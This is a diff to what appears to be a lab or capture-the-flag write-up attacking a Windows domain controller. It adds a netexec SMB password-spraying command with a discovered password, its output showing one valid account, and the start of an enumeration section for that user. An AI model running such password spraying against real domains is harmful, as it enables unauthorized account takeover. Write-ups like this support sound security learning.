@@ -274,3 +274,16 @@ Found user `jay` `carlito` and `points`
 
 I can try and spray the password against these users!
 
+```python
+nxc smb dc01.casper.hsm -u users.txt -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --continue-on-success
+SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.31.82      445    DC01             [-] casper.hsm\jay:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
+SMB         10.0.31.82      445    DC01             [-] casper.hsm\points:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
+SMB         10.0.31.82      445    DC01             [-] casper.hsm\carlito:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
+SMB         10.0.31.82      445    DC01             [+] casper.hsm\xjr:fFvq52PzJpO98X8!
+```
+
+I also assumed `xjr` would be a user so i added them to the list!
+
+# Enumeration as `xjr`
+
